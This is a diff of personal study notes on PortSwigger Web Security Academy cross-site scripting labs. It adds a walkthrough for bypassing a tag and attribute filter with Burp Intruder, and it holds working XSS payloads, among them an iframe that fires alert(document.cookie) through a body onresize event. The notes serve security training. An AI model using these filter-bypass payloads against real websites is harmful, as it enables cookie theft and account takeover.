@@ -352,13 +352,31 @@ It allows an attacker to circumvent the same origin policy.
 
 Search bar ```<img src=x onerror=alert(1)>```
 
+### [Lab]: Reflected XSS into HTML context with most tags and attributes blocked
+
+```<h1>0 search results for 'asdf'</h1>```
+
+- ```<script>alert(document.cookie)</script>``` tags not allowed.
+- ```alert(document.cookie)``` is not blocked.
+- ```<>``` tags not allowed.
+- No URL encoding.
+
+Couldn't figure it out after a long time, so looked at the solution.
+
+- Use Burp to intercept search request.
+- Send request to Intruder.
+- Use Portswigger's XSS cheat sheet (copy payloads).
+- Saw that ```<body>``` returned 200.
+- Use events (from cheat sheet) along with blockquote.
+- ```<body resize=1>``` returned 200.
+- But, we need to resize the body to trigger the payload.
+- Therefore, change width ```onload```.
+
+```
+<iframe src="https://acd01f971f79e697801234c9007200e0.web-security-academy.net/?search=%3Cbody+onresize%3Dalert%28document.cookie%29%3E" onload=this.style.width='100px'>
+```
+
 ### [Lab]: Stored XSS into HTML context with nothing encoded
 
 Comment ```<img src=x onerror=alert(1)>```
-
-### [Lab]: Reflected XSS into HTML context with most tags and attributes blocked
-
-
-
-
 
